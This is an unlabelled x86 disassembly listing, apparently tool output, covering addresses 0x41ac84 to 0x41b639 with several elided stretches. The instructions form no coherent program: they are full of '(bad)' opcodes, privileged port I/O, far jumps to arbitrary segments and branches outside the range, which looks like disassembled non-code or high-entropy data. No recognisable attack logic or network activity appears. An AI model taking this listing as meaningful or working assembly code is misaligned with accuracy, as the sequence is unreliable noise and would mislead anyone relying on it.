  41ac84:	dec    ecx
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0x1e000001,al
  41ac8d:	enter  0xb7b8,0x74
  41ac91:	adc    eax,0x160d373a
  41ac96:	push   ebx
  41ac97:	jnp    0x41ace7
  41ac99:	add    dl,BYTE PTR [ecx+0x601147ed]
  41ac9f:	mov    dh,0x7d
  41aca1:	in     al,dx
  41aca2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41aca4:	pop    es
  41aca5:	enter  0x3f7a,0x7d
  41aca9:	test   DWORD PTR [ecx+0x7d],eax
  41acac:	inc    esi
  41acad:	xchg   edx,eax
  41acae:	cld    
  41acaf:	rcl    al,0x0
  41acb2:	mov    WORD PTR [ecx+0x347d42b5],?
  41acb8:	or     eax,DWORD PTR es:[esp+ebx*8-0x4279401c]
  41acc0:	push   eax
  41acc1:	cmp    eax,0x6cfd3feb
  41acc6:	xchg   esp,eax
  41acc7:	in     al,0x20
  41acc9:	xor    dl,cl
  41accb:	pop    ebp
  41accc:	inc    ecx
  41accd:	add    ebx,ebx
  41accf:	fimul  WORD PTR [ebp+edi*1+0x69b33968]
  41acd6:	(bad)  
  41acd7:	dec    edi
  41acd8:	scas   eax,DWORD PTR es:[edi]
  41acd9:	loope  0x41aca1
  41acdb:	cdq    
  41acdc:	jge    0x41ac7a
  41acde:	ds jmp 0x2558a3cf
  41ace4:	add    edi,ebx
  41ace6:	les    esi,FWORD PTR gs:[ebp-0x1d]
  41acea:	mov    edi,0x23e44ec7
  41acef:	jmp    0x3b438113
  41acf4:	adc    DWORD PTR [esi],ecx
  41acf6:	scas   al,BYTE PTR es:[edi]
  41acf7:	xlat   BYTE PTR ds:[ebx]
  41acf8:	sar    BYTE PTR [ebx-0x7a418f83],0xc6
  41acff:	sub    DWORD PTR [ebx+esi*8],esp
  41ad02:	arpl   WORD PTR [ebx],si
  41ad04:	test   DWORD PTR [edi],edx
  41ad06:	pop    ss
  41ad07:	and    esp,DWORD PTR [eax]
  41ad09:	jne    0x41acca
  41ad0b:	(bad)  
  41ad0c:	xchg   ebx,eax
  41ad0d:	and    al,0xfe
  41ad0f:	xor    DWORD PTR [ebp-0x7f40e2dd],ebp
  41ad15:	cmp    eax,0x7d15869e
  41ad1a:	add    ebx,ebp
  41ad1c:	rol    bh,0x87
  41ad1f:	xchg   ebx,eax
  41ad20:	push   esi
  41ad21:	mov    cl,0xf3
  41ad23:	xchg   esp,eax
  41ad24:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ad26:	test   DWORD PTR [edx-0x3e68f52e],esp
  41ad2c:	pop    es
  41ad2d:	out    dx,al
  41ad2e:	shr    dh,cl
  41ad30:	iret   
  41ad31:	fs retf 0x7648
  41ad35:	mov    al,BYTE PTR [esi-0x42]
  41ad38:	inc    ecx
  41ad39:	jmp    0x41ada9
  41ad3b:	mov    edx,0xd54db6bc
  41ad40:	xchg   ecx,eax
  41ad41:	push   ss
  41ad42:	mov    bl,0x5d
  41ad44:	and    bl,BYTE PTR [ebp-0x45]
  41ad47:	cld    
  41ad48:	mov    dl,0x99
  41ad4a:	or     eax,0x83b3d0a6
  41ad4f:	xor    al,0xa3
  41ad51:	ins    BYTE PTR es:[edi],dx
  41ad52:	ret    0x8ccb
  41ad55:	add    esp,ebx
  41ad57:	ret    
  41ad58:	or     ch,dh
  41ad5a:	jnp    0x41ad58
  41ad5c:	iret   
  41ad5d:	aaa    
  41ad5e:	mov    esp,0x51fff847
  41ad63:	push   0x82eec04d
  41ad68:	retf   0x9cba
  41ad6b:	adc    al,0xfd
  41ad6d:	pop    ss
  41ad6e:	ss pop ss
  41ad70:	cmp    dh,BYTE PTR [esi+0x5b]
  41ad73:	cmp    al,0x63
  41ad75:	or     BYTE PTR [esp+eiz*2],cl
  41ad78:	dec    esi
  41ad79:	xchg   esp,eax
  41ad7a:	out    dx,eax
  41ad7b:	pop    es
  41ad7c:	cmc    
  41ad7d:	fs mov ecx,eax
  41ad80:	mov    bp,0x9718
  41ad84:	xor    BYTE PTR [edi],bh
  41ad86:	cdq    
  41ad87:	cmp    edx,ebx
  41ad89:	mov    dl,0xac
  41ad8b:	sbb    DWORD PTR [ebx],0x6c749de3
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebx+eax*8+0x4e033719],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	xor    eax,0x29d09b0f
  41ae11:	mov    ds:0xb0314ca6,al
  41ae16:	pusha  
  41ae17:	sub    edx,0xadc877fe
  41ae1d:	in     eax,dx
  41ae1e:	push   edi
  41ae1f:	fdivr  DWORD PTR [ecx+0x27c7bf85]
  41ae25:	dec    esp
  41ae26:	push   eax
  41ae27:	out    0x17,eax
  41ae29:	push   eax
  41ae2a:	test   eax,0x7ef80f3c
  41ae2f:	test   eax,0xd9af0504
  41ae34:	stos   DWORD PTR es:[edi],eax
  41ae35:	mov    esi,0xbfdb0fee
  41ae3a:	dec    ebx
  41ae3b:	and    ch,cl
  41ae3d:	aam    0xbf
  41ae3f:	dec    ebx
  41ae40:	popf   
  41ae41:	adc    bh,ch
  41ae43:	sbb    DWORD PTR [eax-0x59],esp
  41ae46:	mov    dl,BYTE PTR [eax+0x263f39fa]
  41ae4c:	inc    edx
  41ae4d:	lods   eax,DWORD PTR ds:[esi]
  41ae4e:	mov    ch,0x1e
  41ae50:	ss gs jnp 0x41ae20
  41ae54:	xlat   BYTE PTR ds:[ebx]
  41ae55:	int3   
  41ae56:	shr    BYTE PTR [edx-0x4f9cb7b1],cl
  41ae5c:	mov    edx,0x1c5f3ab1
  41ae61:	lods   eax,DWORD PTR ds:[esi]
  41ae62:	ins    BYTE PTR es:[edi],dx
  41ae63:	inc    esp
  41ae64:	fidivr DWORD PTR [ecx+0x2e]
  41ae67:	ret    
  41ae68:	jae    0x41aec0
  41ae6a:	mov    ds:0xaa5ae83f,eax
  41ae6f:	sbb    edi,DWORD PTR [eax+0x16]
  41ae72:	nop
  41ae73:	loopne 0x41ae5e
  41ae75:	add    eax,ebp
  41ae77:	jecxz  0x41aed9
  41ae79:	sbb    ecx,DWORD PTR [edx]
  41ae7b:	sub    dh,BYTE PTR [edi]
  41ae7d:	dec    ebp
  41ae7e:	mov    ah,0xf4
  41ae80:	cmp    ch,ah
  41ae82:	ins    DWORD PTR es:[edi],dx
  41ae83:	pushf  
  41ae84:	(bad)  
  41ae85:	or     esp,DWORD PTR [ebx]
  41ae87:	mov    bh,0xdd
  41ae89:	(bad)  
  41ae8a:	xchg   ebx,eax
  41ae8b:	push   ss
  41ae8c:	retf   
  41ae8d:	jge    0x41ae8b
  41ae8f:	add    ebx,edx
  41ae91:	xor    ebx,ebp
  41ae93:	fldcw  WORD PTR [esi-0x5622efb6]
  41ae99:	in     eax,0xf4
  41ae9b:	mov    WORD PTR [esi-0x6a],es
  41ae9e:	adc    eax,0x99780143
  41aea3:	and    al,0xbf
  41aea5:	push   ecx
  41aea6:	pop    ss
  41aea7:	add    al,al
  41aea9:	pop    ebx
  41aeaa:	popa   
  41aeab:	je     0x41af19
  41aead:	cmp    BYTE PTR [edi],dl
  41aeaf:	adc    al,0xc7
  41aeb1:	call   0xcf807bd7
  41aeb6:	in     eax,dx
  41aeb7:	sub    DWORD PTR [edx-0x46],eax
  41aeba:	popa   
  41aebb:	lahf   
  41aebc:	and    BYTE PTR [edx],bh
  41aebe:	push   ebx
  41aebf:	sub    ah,BYTE PTR [eax+ecx*8-0x2ee835f4]
  41aec6:	pop    esp
  41aec7:	out    dx,eax
  41aec8:	push   ds
  41aec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeca:	inc    eax
  41aecb:	xor    ecx,DWORD PTR gs:[edi]
  41aece:	sbb    eax,0xdf7d0acb
  41aed3:	fst    st(4)
  41aed5:	retf   0x2c86
  41aed8:	lea    esi,[edx-0x78]
  41aedb:	sbb    BYTE PTR [ecx+edx*8+0x3a],al
  41aedf:	in     al,0x99
  41aee1:	xchg   esi,eax
  41aee2:	mov    DWORD PTR [esi+0x32],eax
  41aee5:	xor    BYTE PTR [edi+0x482c2a69],cl
  41aeeb:	sub    ah,0xe6
  41aeee:	int    0x9e
  41aef0:	retf   0x6f1b
  41aef3:	xchg   BYTE PTR [eax],dh
  41aef5:	xor    ebp,DWORD PTR [ebx+0x12e1dea2]
  41aefb:	(bad)  
  41aefc:	call   0x5e0e4c1c
  41af01:	sub    BYTE PTR [ecx],cl
  41af03:	arpl   bx,di
  41af05:	mov    al,ds:0x48b0de9f
  41af0a:	push   ecx
  41af0b:	jmp    0x41af7c
  41af0d:	mov    edx,0x15e15d
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xc1d244ee
  41af82:	cdq    
  41af83:	mov    al,0x53
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xd3000001
  41af8d:	add    BYTE PTR [ebx],ah
  41af8f:	cmp    al,0xc6
  41af91:	loope  0x41afe1
  41af93:	jb     0x41af9a
  41af95:	inc    ebp
  41af96:	pop    ss
  41af97:	adc    al,0x6a
  41af99:	fist   DWORD PTR [ecx]
  41af9b:	dec    edi
  41af9c:	push   ebx
  41af9d:	fisub  DWORD PTR [ebx+0x7e8054c4]
  41afa3:	sub    DWORD PTR [ebp+edi*1-0x8d35bc],0x15
  41afab:	mov    edx,edx
  41afad:	jmp    0x41af5b
  41afaf:	or     eax,0x89d3ec57
  41afb4:	ror    DWORD PTR [eax-0x73],1
  41afb7:	and    ecx,DWORD PTR [ebx+ebx*2-0x44]
  41afbb:	inc    eax
  41afbc:	les    ecx,FWORD PTR [ebx+0x2930ba79]
  41afc2:	xor    BYTE PTR [ecx+0x1b844fc8],ah
  41afc8:	inc    edx
  41afc9:	sbb    al,0x42
  41afcb:	test   eax,0x4dc1c2ee
  41afd0:	(bad)  
  41afd1:	xchg   ebp,eax
  41afd2:	pop    ebp
  41afd3:	inc    eax
  41afd4:	daa    
  41afd5:	xchg   esp,eax
  41afd6:	les    esi,FWORD PTR [eax]
  41afd8:	stc    
  41afd9:	cmp    ch,ah
  41afdb:	xchg   esp,eax
  41afdc:	mov    esi,0x8b3251ed
  41afe1:	mov    ah,0x21
  41afe3:	add    BYTE PTR [edi+0x5576a082],dh
  41afe9:	or     BYTE PTR [ecx],ah
  41afeb:	call   0xad0322a5
  41aff0:	and    bh,cl
  41aff2:	retf   0x5a11
  41aff5:	jmp    0xa7be:0x65a541f9
  41affc:	jl     0x41afc3
  41affe:	sbb    ebx,DWORD PTR [ebx-0x12ff5f0a]
  41b004:	and    BYTE PTR [ecx+ebx*2-0x1df89b11],dl
  41b00b:	fild   WORD PTR [edi+ebx*2-0x24]
  41b00f:	and    dh,BYTE PTR [ecx+eax*2+0x42bb7b24]
  41b016:	pop    esp
  41b017:	out    0x7d,eax
  41b019:	xlat   BYTE PTR ds:[ebx]
  41b01a:	cmp    eax,0xa9cf630
  41b01f:	inc    ebp
  41b020:	adc    edx,DWORD PTR [ecx]
  41b022:	xchg   ebp,eax
  41b023:	inc    ecx
  41b024:	inc    ebx
  41b025:	xchg   esp,eax
  41b026:	pop    ecx
  41b027:	jge    0x41afe1
  41b029:	lods   al,BYTE PTR ds:[esi]
  41b02a:	dec    ebp
  41b02b:	(bad)  
  41b02c:	fbstp  TBYTE PTR [edx+0x2d]
  41b02f:	push   0x596c27d5
  41b034:	mov    ebp,0xa21a4ac4
  41b039:	dec    ebp
  41b03a:	cmp    BYTE PTR [edx-0x5e],bh
  41b03d:	bound  ecx,QWORD PTR [ecx-0x5b]
  41b040:	cmp    al,0x1d
  41b042:	or     cl,cl
  41b044:	mov    bl,0xc3
  41b046:	ret    0x9f3b
  41b049:	mov    bl,0xb6
  41b04b:	and    ah,BYTE PTR [edx+eiz*8+0x2a]
  41b04f:	lods   eax,DWORD PTR ds:[esi]
  41b050:	dec    edi
  41b051:	(bad)  
  41b052:	or     bl,BYTE PTR [ebp+0x14223a67]
  41b058:	mov    eax,ds:0x6882e54f
  41b05d:	add    eax,ebx
  41b05f:	(bad)  [ecx]
  41b061:	pop    edi
  41b062:	push   0x5bb9ec7d
  41b067:	(bad)  
  41b068:	fdivr  st(4),st
  41b06a:	inc    ebx
  41b06b:	into   
  41b06c:	push   es
  41b06d:	mov    edx,0x94824a80
  41b072:	cmc    
  41b073:	mov    ds:0x6831ee4c,al
  41b078:	cmp    DWORD PTR [eax-0x67],ecx
  41b07b:	adc    dh,BYTE PTR [edx-0x7c]
  41b07e:	jmp    0x41b063
  41b080:	jnp    0x41b042
  41b082:	xor    al,0xe9
  41b084:	inc    ebp
  41b085:	icebp  
  41b086:	xor    al,0x62
  41b088:	inc    edi
  41b089:	(bad)  
  41b08a:	sti    
  41b08b:	(bad)  
  41b08c:	xor    cl,BYTE PTR [edi]
  41b08e:	push   cs
  41b08f:	cs lahf 
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xc0371995
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xd4000001
  41b10d:	xchg   edi,eax
  41b10e:	ret    0x3184
  41b111:	sbb    DWORD PTR [eax],ecx
  41b113:	in     eax,dx
  41b114:	sub    al,0x45
  41b116:	dec    ebx
  41b117:	sub    eax,0x4a01e079
  41b11c:	pusha  
  41b11d:	add    al,0x12
  41b11f:	mov    dh,0xb5
  41b121:	push   0xfffffff2
  41b123:	mov    bl,0x5c
  41b125:	mov    cl,0xfb
  41b127:	retf   
  41b128:	icebp  
  41b129:	or     esi,ebx
  41b12b:	cmp    eax,0x2718316b
  41b130:	add    BYTE PTR [edx-0x1e],ch
  41b133:	outs   dx,BYTE PTR ds:[esi]
  41b134:	fs (bad) 
  41b136:	jp     0x41b17b
  41b138:	sub    cl,BYTE PTR [edi]
  41b13a:	ja     0x41b0e6
  41b13c:	dec    ebp
  41b13d:	sub    bl,BYTE PTR [ecx-0x49025a21]
  41b143:	in     al,0x74
  41b145:	arpl   bx,dx
  41b147:	dec    DWORD PTR [eax]
  41b149:	xor    DWORD PTR [edi-0x9],ecx
  41b14c:	ret    
  41b14d:	call   0x27c3:0x6f98ec89
  41b154:	add    eax,0xf94c3b65
  41b159:	nop
  41b15a:	add    BYTE PTR [edx-0x6d3f0cd5],ah
  41b160:	jno    0x41b197
  41b162:	cli    
  41b163:	add    al,0xc0
  41b165:	sbb    dl,BYTE PTR [eax+0xf4539fb]
  41b16b:	sub    DWORD PTR [edx-0x33a29b3e],0xffffff8b
  41b172:	aas    
  41b173:	adc    ecx,ebp
  41b175:	dec    ebp
  41b176:	jl     0x41b153
  41b178:	pushf  
  41b179:	aaa    
  41b17a:	xor    dh,bl
  41b17c:	fmul   QWORD PTR [esi]
  41b17e:	sub    al,BYTE PTR [eax+0x3fb80106]
  41b184:	scas   al,BYTE PTR es:[di]
  41b186:	adc    BYTE PTR [ecx],dh
  41b188:	imul   edi,DWORD PTR [edi],0x818ae38f
  41b18e:	icebp  
  41b18f:	mov    ah,bl
  41b191:	pop    ebx
  41b192:	dec    ebp
  41b193:	es loope 0x41b172
  41b196:	sbb    bh,0x22
  41b199:	(bad)
  41b19c:	jp     0x41b1a6
  41b19e:	and    edi,ebp
  41b1a0:	sbb    edi,DWORD PTR [eax]
  41b1a2:	sahf   
  41b1a3:	push   ds
  41b1a4:	cwde   
  41b1a5:	cmp    BYTE PTR ds:0x26e0e6e4,al
  41b1ab:	mov    edi,ebx
  41b1ad:	pop    es
  41b1ae:	sub    DWORD PTR [ecx],eax
  41b1b0:	mov    al,ds:0x4d259900
  41b1b5:	stc    
  41b1b6:	jno    0x41b216
  41b1b8:	mov    al,0xa8
  41b1ba:	xchg   edx,eax
  41b1bb:	mov    bl,0x75
  41b1bd:	ja     0x41b23a
  41b1bf:	xchg   dh,cl
  41b1c1:	int    0x1a
  41b1c3:	popf   
  41b1c4:	or     ah,cl
  41b1c6:	adc    DWORD PTR [eax],edx
  41b1c8:	sar    dl,0x16
  41b1cb:	dec    esp
  41b1cc:	sub    al,0x88
  41b1ce:	mov    dh,0x6f
  41b1d0:	fiadd  DWORD PTR [ecx]
  41b1d2:	cmc    
  41b1d3:	call   0xe511:0x73762f91
  41b1da:	iret   
  41b1db:	loope  0x41b1c0
  41b1dd:	xchg   BYTE PTR [ecx+ecx*1],ah
  41b1e0:	or     esp,esi
  41b1e2:	pop    edx
  41b1e3:	adc    dh,BYTE PTR [ebp+0x5f]
  41b1e6:	push   esp
  41b1e7:	mov    cl,0xa
  41b1e9:	hlt    
  41b1ea:	div    DWORD PTR [ebp+0x75e597f3]
  41b1f0:	aad    0x4c
  41b1f2:	pop    ebp
  41b1f3:	dec    esp
  41b1f4:	cmp    ebx,DWORD PTR [ebx+0x2ad086c6]
  41b1fa:	mov    ds:0x36a87951,al
  41b1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b200:	and    eax,0x3cd932ee
  41b205:	sub    BYTE PTR [ecx-0x3],bh
  41b208:	and    ecx,DWORD PTR [ecx]
  41b20a:	or     al,0x0
  41b20c:	xor    cl,dh
  41b20e:	clc    
  41b20f:	or     edx,DWORD PTR [eax+eax*1+0x0]
	...
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebp+0x48],dl
  41b282:	es and al,0x5d
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0x95000001,al
  41b28d:	call   0x3911:0x4f1136a6
  41b294:	push   edx
  41b295:	dec    esi
  41b296:	je     0x41b2d8
  41b298:	outs   dx,DWORD PTR ds:[esi]
  41b299:	and    al,BYTE PTR [edx+0x30f5406b]
  41b29f:	sbb    DWORD PTR [esp+esi*4-0x54],esp
  41b2a3:	sti    
  41b2a4:	daa    
  41b2a5:	pop    edx
  41b2a6:	pop    ss
  41b2a7:	jbe    0x41b2df
  41b2a9:	sete   BYTE PTR [edx-0x7871d235]
  41b2b0:	mov    ecx,0xb410b8a1
  41b2b5:	lea    ebp,[eax+ecx*1-0x1af0c698]
  41b2bc:	jb     0x41b306
  41b2be:	pop    esi
  41b2bf:	cwde   
  41b2c0:	jbe    0x41b2df
  41b2c2:	ins    DWORD PTR es:[edi],dx
  41b2c3:	xor    DWORD PTR [eax+ebx*8-0x1f9a969b],0x6a
  41b2cb:	jno    0x41b282
  41b2cd:	xchg   edi,eax
  41b2ce:	push   ecx
  41b2cf:	mov    ebx,0x8df8f4bb
  41b2d4:	ds pop ecx
  41b2d6:	outs   dx,BYTE PTR ds:[esi]
  41b2d7:	and    edx,DWORD PTR [edi-0x68bef3ef]
  41b2dd:	and    BYTE PTR [esi-0x26],ah
  41b2e0:	cmp    BYTE PTR [ebx-0x6e532241],dl
  41b2e6:	repnz pop ebp
  41b2e8:	aad    0x45
  41b2ea:	loopne 0x41b2a8
  41b2ec:	sub    esi,DWORD PTR [ebp+0x3d]
  41b2ef:	(bad)  
  41b2f0:	call   0x1b803e9a
  41b2f5:	sbb    esi,DWORD PTR [esi-0x42]
  41b2f8:	and    eax,0xbc9efae7
  41b2fd:	xchg   edi,eax
  41b2fe:	(bad)  
  41b2ff:	mov    ecx,0xbfa30c10
  41b304:	mov    ebx,0x677edc17
  41b309:	xchg   ebx,eax
  41b30a:	jnp    0x41b31c
  41b30c:	xchg   DWORD PTR [esi-0x3e],ebx
  41b30f:	aas    
  41b310:	stc    
  41b311:	pop    ecx
  41b312:	ins    BYTE PTR es:[edi],dx
  41b313:	mov    al,0x64
  41b315:	xchg   BYTE PTR [edx],cl
  41b317:	mov    ds:0x6a97b18a,eax
  41b31c:	mov    bh,ah
  41b31e:	std    
  41b31f:	push   ebx
  41b320:	xor    eax,0xe4ac7e97
  41b325:	fwait
  41b326:	das    
  41b327:	aas    
  41b328:	pop    ds
  41b329:	cmc    
  41b32a:	pop    ss
  41b32b:	push   eax
  41b32c:	mov    esi,0xbf8c15d4
  41b331:	(bad)  
  41b332:	(bad)
  41b335:	into   
  41b336:	std    
  41b337:	mov    al,0x8f
  41b339:	cs jg  0x41b31b
  41b33c:	adc    BYTE PTR [edi+0x79],cl
  41b33f:	rol    BYTE PTR [eax],0xb5
  41b342:	ins    DWORD PTR es:[edi],dx
  41b343:	or     DWORD PTR [eax-0x225b45d0],esi
  41b349:	mov    eax,ds:0x1411c259
  41b34e:	js     0x41b35d
  41b350:	jae    0x41b2db
  41b352:	test   eax,0x1d7f197a
  41b357:	ds mov ch,0x9c
  41b35a:	fisubr WORD PTR [ecx-0x7aef1b98]
  41b360:	jo     0x41b3ab
  41b362:	fstp   TBYTE PTR [ebx]
  41b364:	inc    esp
  41b365:	call   0x6bd7b212
  41b36a:	leave  
  41b36b:	add    al,0xad
  41b36d:	imul   eax,DWORD PTR [edi+0x64],0x5c8b2a5f
  41b374:	xlat   BYTE PTR ds:[ebx]
  41b375:	popf   
  41b376:	sub    eax,0xdfc5b41e
  41b37b:	fbld   TBYTE PTR [edi+0x4f]
  41b37e:	(bad)  
  41b37f:	retf   0x2593
  41b382:	mov    ah,0xcb
  41b384:	mov    eax,0x9feabd25
  41b389:	loopne 0x41b3a6
  41b38b:	cmp    DWORD PTR [eax],ecx
  41b38d:	repz loope 0x41b327
  41b390:	fild   WORD PTR [eax]
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	mov    eax,0x623eaa86
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR ds:0xcd000001,al
  41b40d:	pop    ebx
  41b40e:	call   0xadea1b40
  41b413:	scas   eax,DWORD PTR es:[edi]
  41b414:	fidiv  WORD PTR [esi]
  41b416:	shr    DWORD PTR [ebp+0x10749ad8],1
  41b41c:	mov    bh,0x22
  41b41e:	mov    edx,0xfaf63c7f
  41b423:	lahf   
  41b424:	std    
  41b425:	xor    dh,BYTE PTR [edi*2-0x6b25ea19]
  41b42c:	inc    ecx
  41b42d:	xor    BYTE PTR [ebp-0x368f206c],dh
  41b433:	imul   esi,DWORD PTR [ebp-0x79],0xe
  41b437:	or     eax,0x7bc28ee
  41b43c:	or     al,0x36
  41b43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b43f:	data16 lahf 
  41b441:	xlat   BYTE PTR ds:[ebx]
  41b442:	pop    es
  41b443:	clc    
  41b444:	sbb    eax,0xe175ff5a
  41b449:	stc    
  41b44a:	loop   0x41b41e
  41b44c:	sbb    DWORD PTR ss:[ebp-0x77b68386],edx
  41b453:	test   eax,0x8173d67a
  41b458:	xor    eax,0xd33bd261
  41b45d:	(bad)  
  41b45e:	loop   0x41b407
  41b460:	sbb    ebp,DWORD PTR [edi-0x2d]
  41b463:	scas   al,BYTE PTR es:[edi]
  41b464:	cmp    bh,0xb4
  41b467:	or     bl,0xc2
  41b46a:	fs pop ebx
  41b46c:	mov    ds:0x9db1ff6f,al
  41b471:	mov    dh,0x37
  41b473:	and    eax,0x782d2fbb
  41b478:	mov    eax,0xb6bda6e4
  41b47d:	and    al,0xa
  41b47f:	out    dx,al
  41b480:	jmp    0x32d768c5
  41b485:	and    bh,dl
  41b487:	out    0xb1,eax
  41b489:	clc    
  41b48a:	ret    0xd530
  41b48d:	xor    al,0x29
  41b48f:	iret   
  41b490:	jg     0x41b4bf
  41b492:	adc    BYTE PTR ds:0x929576c3,dh
  41b498:	and    ecx,DWORD PTR [edi]
  41b49a:	fcmovu st,st(5)
  41b49c:	jne    0x41b44e
  41b49e:	cld    
  41b49f:	fild   DWORD PTR [edx+esi*1+0x2d4d06c2]
  41b4a6:	scas   al,BYTE PTR es:[edi]
  41b4a7:	fst    DWORD PTR [ecx-0x64daac0b]
  41b4ad:	icebp  
  41b4ae:	test   DWORD PTR [edi],0x72d24e2b
  41b4b4:	mov    BYTE PTR [ebp-0x1c822261],cl
  41b4ba:	mov    dl,0x37
  41b4bc:	sub    BYTE PTR [ecx+edx*4],dh
  41b4bf:	sbb    ah,BYTE PTR ds:[ebx-0x14]
  41b4c3:	xchg   edx,eax
  41b4c4:	call   0xc2dbd22a
  41b4c9:	(bad)  
  41b4ca:	mov    al,0xc0
  41b4cc:	mov    edi,0x56450143
  41b4d1:	das    
  41b4d2:	fwait
  41b4d3:	mov    eax,0x733272d8
  41b4d8:	outs   dx,BYTE PTR ds:[esi]
  41b4d9:	(bad)  
  41b4da:	not    BYTE PTR [edx]
  41b4dc:	(bad)  
  41b4dd:	in     al,0xb
  41b4df:	call   0xe77580a1
  41b4e4:	or     bl,BYTE PTR [esi+0x9f7fa1]
  41b4ea:	lods   al,BYTE PTR ds:[esi]
  41b4eb:	add    bh,cl
  41b4ed:	sbb    DWORD PTR [ebx-0x14a30ec0],eax
  41b4f3:	ds pop esp
  41b4f5:	out    dx,eax
  41b4f6:	mov    ds:0x455c6ced,al
  41b4fb:	js     0x41b575
  41b4fd:	scas   al,BYTE PTR es:[edi]
  41b4fe:	cdq    
  41b4ff:	pop    es
  41b500:	fmul   DWORD PTR [ebp+0xf]
  41b503:	push   cs
  41b504:	fild   QWORD PTR [esi]
  41b506:	imul   eax,ecx,0xeab7465c
  41b50c:	mov    DWORD PTR [ecx],esp
  41b50e:	idiv   BYTE PTR [eax-0x78]
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	xchg   ebx,eax
  41b581:	dec    edx
  41b582:	ror    BYTE PTR [eax],1
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0xd2000001,al
  41b58d:	arpl   WORD PTR [ebx],ax
  41b58f:	clc    
  41b590:	add    dh,ah
  41b592:	push   cs
  41b593:	retf   0x8c42
  41b596:	and    eax,0x2b2dc8f6
  41b59b:	push   0xffffff88
  41b59d:	test   BYTE PTR [ecx+0x6c53d414],0x2b
  41b5a4:	cmc    
  41b5a5:	ins    BYTE PTR es:[edi],dx
  41b5a6:	scas   al,BYTE PTR es:[edi]
  41b5a7:	and    al,0xc6
  41b5a9:	in     al,dx
  41b5aa:	pop    ecx
  41b5ab:	push   esi
  41b5ac:	ds mov ds,ebp
  41b5af:	ret    0x409b
  41b5b2:	mov    dl,0x77
  41b5b4:	sti    
  41b5b5:	fsub   DWORD PTR [eax-0x3234b0c7]
  41b5bb:	popa   
  41b5bc:	pop    edx
  41b5bd:	sbb    DWORD PTR [esi+eiz*4-0x2166980],ecx
  41b5c4:	mov    dl,0x57
  41b5c6:	sub    ah,BYTE PTR [edi+eax*2]
  41b5c9:	xchg   edx,eax
  41b5ca:	mov    ebx,0x6c576bca
  41b5cf:	add    al,0xec
  41b5d1:	ins    DWORD PTR es:[edi],dx
  41b5d2:	mov    cl,0x56
  41b5d4:	push   ds
  41b5d5:	add    DWORD PTR ds:0x5f881c83,0x3
  41b5dc:	add    edx,DWORD PTR [eax+0x1e1b49d5]
  41b5e2:	or     BYTE PTR [ebp-0x1f],ch
  41b5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5e6:	clc    
  41b5e7:	aaa    
  41b5e8:	push   ebp
  41b5e9:	test   DWORD PTR [ebp+esi*4-0x5c],ebx
  41b5ed:	aam    0xf8
  41b5ef:	inc    edx
  41b5f0:	out    dx,al
  41b5f1:	add    al,0x21
  41b5f3:	outs   dx,BYTE PTR ds:[esi]
  41b5f4:	pop    ss
  41b5f5:	lods   al,BYTE PTR ss:[esi]
  41b5f7:	xlat   BYTE PTR ds:[ebx]
  41b5f8:	popf   
  41b5f9:	loop   0x41b5c9
  41b5fb:	stc    
  41b5fc:	fdiv   DWORD PTR [esi-0x65]
  41b5ff:	sub    DWORD PTR [eax+ecx*4-0x78],ebx
  41b603:	xlat   BYTE PTR ds:[ebx]
  41b604:	int    0x4b
  41b606:	jle    0x41b5f4
  41b608:	xor    DWORD PTR [eax-0x1c],edi
  41b60b:	repnz lea esp,[eax+0x6c]
  41b60f:	jp     0x41b67f
  41b611:	push   ecx
  41b612:	imul   ebx,DWORD PTR [ebp+0x2c],0x7f
  41b616:	shl    BYTE PTR [esp+ebx*1],0xc8
  41b61a:	shl    BYTE PTR [esi+0x44],0x7c
  41b61e:	test   eax,0xbf8c2ba7
  41b623:	jnp    0x41b5ff
  41b625:	sbb    ebx,eax
  41b627:	aaa    
  41b628:	ins    BYTE PTR es:[edi],dx
  41b629:	imul   ebp,ebx,0x6e
  41b62c:	or     ebx,DWORD PTR ds:0x43df8a2b
  41b632:	add    eax,0xdc6c1916
  41b637:	add    al,0x80
  41b639:	rcl    BYTE PTR [edi-0x68],1
